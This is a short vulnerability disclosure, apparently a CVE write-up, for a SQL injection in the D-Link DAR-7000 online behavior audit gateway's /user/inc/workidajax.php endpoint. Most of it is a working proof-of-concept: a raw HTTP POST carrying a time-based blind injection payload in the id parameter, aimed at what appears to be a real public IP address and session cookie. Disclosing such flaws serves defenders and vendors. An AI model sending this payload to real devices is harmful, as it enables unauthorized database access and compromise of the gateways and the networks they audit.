There is a backend SQL injection vulnerability in the D-LINK DAR-7000 series online behavior audit gateway. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000

Vulnerability Path ：/user/inc/workidajax.php

POC：
```
POST /user/inc/workidajax.php HTTP/1.1
Host: 58.18.133.60:8443
Cookie: PHPSESSID=3e814ce27f6d6cdc6a2e910d27132338
Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 69

src=exempttraffic&type=del&id=(select*from(select(sleep(3)))a)&value= ![image](https://github.com/flyyue2001/cve/assets/88701694/8022f586-7ede-49de-a50f-400f9700c601)

```

<img width="813" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/f651a204-2b37-4d0f-9b19-0bc5938686fd">
